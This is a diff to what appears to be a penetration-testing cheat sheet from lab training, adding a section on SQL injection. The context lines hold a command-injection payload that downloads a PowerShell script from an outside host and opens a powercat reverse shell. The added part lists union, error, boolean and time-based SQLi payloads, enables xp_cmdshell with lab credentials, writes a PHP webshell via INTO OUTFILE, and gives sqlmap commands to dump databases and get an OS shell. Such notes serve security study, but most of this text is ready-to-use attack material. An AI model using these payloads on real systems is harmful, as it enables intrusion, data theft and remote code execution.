@@ -111,3 +111,56 @@ IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/power
 Command injection:
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
 ```
+
+### SQL Injection Attacks
+
+> **Notes:**
+> * Union-based payloads has to include the same number of columns as the original query and the data types need to be compatible between each column
+> * **Useful Info to retrieve:**
+> 	* `@version / database() / user()`
+> 	* `SELECT table_name, column_name, table_schema FROM information_schema.columns WHERE table_schema=database()`
+> * We can specify php code in a Union-based SQLi and output to a file, then trigger it to gain RCE
+
+| **Payloads** | **Description** |
+| ---- | ---- |
+| `'` | Special characters. If any of them throws an error could mean SQL Injection is possible |
+| `' OR 1=1 -- //` | Basic injection |
+| `' AND 1=1 -- //` | **Boolean-based** SQLi. Since _1=1_ will always be TRUE, the application will return the values only if the user (or whatever field we have filled) is present in the database |
+| `' AND IF (1=1, sleep(3),'false') -- //` | **Time-based** SQLi. IF condition will always be true inside the statement itself, so it will return false if the user is non-existent |
+| **Error-based payloads** | **Description** |
+| `' or 1=1 in (select @@version) -- //` | If it returns the version, querying the database interactively is possible, so we can run queries like this. If we receive an error specifying the number of columns we can filter the query to return just one column |
+| `' or 1=1 in (SELECT password FROM users) -- //` | Example query |
+| **Union-based payloads** | **Description** |
+| `' ORDER BY 1-- //` | To discover the number of columns. It will order the results by a specific column, meaning it will fail whenever the selected column does not exist |
+| `' UNION SELECT table_name, column_name, table_schema FROM information_schema.columns WHERE table_schema=database()  -- //` | Query tables info for current dabatase |
+| **Blind payloads** | **Description** |
+| `' AND IF (1=1, sleep(3),'false') -- //` | **Time-based** SQLi. IF condition will always be true inside the statement itself, so it will return false if the user is non-existent |
+
+Enable code execution in MSSQL (`xp_cmdshell`):
+
+```bash
+kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+SQL> EXECUTE sp_configure 'show advanced options', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+SQL> EXECUTE xp_cmdshell 'whoami';
+root
+```
+
+Write a shell into a file in the server:
+
+```bash
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
+
+We can get an error with the above payload but the error is related to the incorrect return type, and should not impact writing the webshell on disk.
+
+| **SQLMap** | **Description** |
+| ---- | ---- |
+| `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user` | Specify parameter user and use 1 as dummy value |
+| `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump` | Dump the entire database |
+| `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --os-shell` | Gives us a fully interactive shell |
+| `sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"` | Writes a shell in specified server folder by using a request file (POST request via Burp and saved it as a local text file), and returns a fully interactive shell |
